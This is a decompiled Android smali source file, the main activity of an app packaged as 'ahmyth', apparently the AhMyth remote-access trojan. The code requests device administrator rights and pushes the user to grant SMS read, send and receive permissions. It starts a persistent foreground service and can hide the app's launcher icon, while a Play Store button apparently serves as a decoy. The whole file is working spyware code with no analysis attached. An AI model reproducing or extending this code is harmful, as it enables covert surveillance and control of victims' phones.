.class public Lahmyth/mine/king/ahmyth/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"


# instance fields
.field componentName:Landroid/content/ComponentName;

.field devicePolicyManager:Landroid/app/admin/DevicePolicyManager;

.field sharedPreferences:Landroid/content/SharedPreferences;


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 23
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method public fn_hideicon()V
    .locals 4

    .line 96
    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/MainActivity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/MainActivity;->getComponentName()Landroid/content/ComponentName;

    move-result-object v1

    const/4 v2, 0x2

    const/4 v3, 0x1

    invoke-virtual {v0, v1, v2, v3}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 4

    .line 31
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const/high16 p1, 0x7f070000

    .line 32
    invoke-virtual {p0, p1}, Lahmyth/mine/king/ahmyth/MainActivity;->setContentView(I)V

    .line 34
    new-instance p1, Landroid/content/ComponentName;

    const-class v0, Lahmyth/mine/king/ahmyth/AdminReceiver;

    invoke-direct {p1, p0, v0}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iput-object p1, p0, Lahmyth/mine/king/ahmyth/MainActivity;->componentName:Landroid/content/ComponentName;

    const-string p1, "device_policy"

    .line 35
    invoke-virtual {p0, p1}, Lahmyth/mine/king/ahmyth/MainActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/app/admin/DevicePolicyManager;

    iput-object p1, p0, Lahmyth/mine/king/ahmyth/MainActivity;->devicePolicyManager:Landroid/app/admin/DevicePolicyManager;

    .line 37
    iget-object v0, p0, Lahmyth/mine/king/ahmyth/MainActivity;->componentName:Landroid/content/ComponentName;

    invoke-virtual {p1, v0}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result p1

    if-eqz p1, :cond_0

    goto :goto_0

    .line 41
    :cond_0
    new-instance p1, Landroid/content/Intent;

    const-string v0, "android.app.action.ADD_DEVICE_ADMIN"

    invoke-direct {p1, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 42
    iget-object v0, p0, Lahmyth/mine/king/ahmyth/MainActivity;->componentName:Landroid/content/ComponentName;

    const-string v1, "android.app.extra.DEVICE_ADMIN"

    invoke-virtual {p1, v1, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    const v0, 0x7f090001

    .line 43
    invoke-virtual {p0, v0}, Lahmyth/mine/king/ahmyth/MainActivity;->getString(I)Ljava/lang/String;

    move-result-object v0

    const-string v1, "android.app.extra.ADD_EXPLANATION"

    invoke-virtual {p1, v1, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 44
    invoke-virtual {p0, p1}, Lahmyth/mine/king/ahmyth/MainActivity;->startActivity(Landroid/content/Intent;)V

    :goto_0
    const-string p1, "android.permission.READ_SMS"

    .line 48
    invoke-static {p0, p1}, Landroid/support/v4/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result p1

    const/4 v0, 0x1

    if-eqz p1, :cond_1

    const-string p1, "android.permission.SEND_SMS"

    .line 49
    invoke-static {p0, p1}, Landroid/support/v4/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result p1

    if-eqz p1, :cond_1

    const-string p1, "android.permission.RECEIVE_SMS"

    .line 50
    invoke-static {p0, p1}, Landroid/support/v4/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result p1

    if-eqz p1, :cond_1

    .line 52
    new-instance p1, Landroid/content/Intent;

    const-string v1, "android.settings.APPLICATION_DETAILS_SETTINGS"

    invoke-direct {p1, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 53
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "package:"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/MainActivity;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {p1, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    .line 54
    invoke-virtual {p0, p1}, Lahmyth/mine/king/ahmyth/MainActivity;->startActivity(Landroid/content/Intent;)V

    const-string p1, "Grant all permission before!"

    .line 55
    invoke-static {p0, p1, v0}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object p1

    invoke-virtual {p1}, Landroid/widget/Toast;->show()V

    .line 58
    :cond_1
    new-instance p1, Landroid/content/Intent;

    const-class v1, Lahmyth/mine/king/ahmyth/MainService;

    invoke-direct {p1, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 59
    invoke-static {p0, p1}, Landroid/support/v4/content/ContextCompat;->startForegroundService(Landroid/content/Context;Landroid/content/Intent;)V

    .line 65
    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1c

    if-gt p1, v1, :cond_3

    const p1, 0x7f050017

    .line 67
    invoke-virtual {p0, p1}, Lahmyth/mine/king/ahmyth/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/Switch;

    const/4 v1, 0x0

    .line 68
    invoke-virtual {p1, v1}, Landroid/widget/Switch;->setVisibility(I)V

    const-string v2, "AppSettings"

    .line 70
    invoke-virtual {p0, v2, v1}, Lahmyth/mine/king/ahmyth/MainActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    iput-object v2, p0, Lahmyth/mine/king/ahmyth/MainActivity;->sharedPreferences:Landroid/content/SharedPreferences;

    .line 71
    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    .line 73
    new-instance v3, Lahmyth/mine/king/ahmyth/MainActivity$1;

    invoke-direct {v3, p0, v2}, Lahmyth/mine/king/ahmyth/MainActivity$1;-><init>(Lahmyth/mine/king/ahmyth/MainActivity;Landroid/content/SharedPreferences$Editor;)V

    invoke-virtual {p1, v3}, Landroid/widget/Switch;->setOnCheckedChangeListener(Landroid/widget/CompoundButton$OnCheckedChangeListener;)V

    .line 82
    iget-object v2, p0, Lahmyth/mine/king/ahmyth/MainActivity;->sharedPreferences:Landroid/content/SharedPreferences;

    const-string v3, "hidden_status"

    invoke-interface {v2, v3, v1}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    if-eqz v2, :cond_2

    .line 85
    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/MainActivity;->fn_hideicon()V

    .line 86
    invoke-virtual {p1, v0}, Landroid/widget/Switch;->setChecked(Z)V

    goto :goto_1

    .line 89
    :cond_2
    invoke-virtual {p1, v1}, Landroid/widget/Switch;->setChecked(Z)V

    :cond_3
    :goto_1
    return-void
.end method

.method public openGooglePlay(Landroid/view/View;)V
    .locals 2

    .line 104
    new-instance p1, Landroid/content/Intent;

    const-string v0, "https://play.google.com/store/apps"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    const-string v1, "android.intent.action.VIEW"

    invoke-direct {p1, v1, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 105
    invoke-virtual {p0, p1}, Lahmyth/mine/king/ahmyth/MainActivity;->startActivity(Landroid/content/Intent;)V

    return-void
.end method
